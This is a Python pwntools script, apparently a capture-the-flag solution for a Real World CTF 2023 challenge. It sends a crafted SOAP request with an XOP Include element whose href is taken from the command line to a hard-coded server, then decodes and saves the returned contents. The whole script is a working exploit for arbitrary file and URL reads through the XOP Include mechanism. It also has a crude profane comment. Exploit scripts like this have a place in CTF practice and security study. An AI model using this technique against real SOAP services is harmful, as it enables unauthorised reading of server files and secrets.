request = """POST /services/guidance HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml,text/xml;q=0.9,*/*;q=0.8
Content-Type: multipart/related; type="application/xop+xml"; start="<14b7e142-fe6e-4e97-88f3-630d5129602c>"; type="text/xml"; boundary=37da8100-1751-4b01-be31-b450df641f83
User-Agent: node-soap/1.0.0
Accept-Encoding: none
Accept-Charset: utf-8
Connection: close
Host: 198.11.177.96:36883
SOAPAction: ""
Content-Length: XXXXXXXXXX

--37da8100-1751-4b01-be31-b450df641f83
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
Content-ID: <14b7e142-fe6e-4e97-88f3-630d5129602c>

<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://rwctf2023.rw.com/"><soap:Body><tns:showMe><arg0><inc:Include href="URLURLURL" xmlns:inc="http://www.w3.org/2004/08/xop/include"/></arg0></tns:showMe></soap:Body></soap:Envelope>
--37da8100-1751-4b01-be31-b450df641f83--"""

from sys import argv
from pwn import *
from base64 import b64decode

headers, body = request.replace("URLURLURL", argv[1]).split('XXXXXXXXXX')
request = (headers + str(len(body.strip())) + body).encode()

conn = remote('198.11.177.96', 32604)
conn.sendline(request)
response = conn.recvrepeat(5)
conn.close()

encoded = response.split(b'Here is your result: ')[1].split(b'</return>')[0].decode().strip()
encoded = ''.join(encoded.split('\r\n')[0::2]) # Jank chunk merging what the actual fuck, don't do this nonsense
log.info(f'{len(encoded)=}')
decoded = b64decode(encoded)
log.info(f'{len(decoded)=}')

try:
    res = decoded.decode('utf8')
    clean = res.replace("\r", "").replace("\0", "\n")
    log.info(f'Response:\n\n{clean}')
    with open('responses-log', 'a') as f:
        f.write('\n\n')
        f.write(argv[1])
        f.write('\n')
        f.write(clean)
        f.write('\n\n')
except:
    path = argv[1].split('/')[-1]
    with open(path, 'wb') as f:
        f.write(decoded)
        print(f"Wrote to {path}")
    with open('responses-log', 'a') as f:
        f.write('\n\n')
        f.write(argv[1])
        f.write('\n')
        f.write('    DUMPED TO FILE')
        f.write('\n\n')
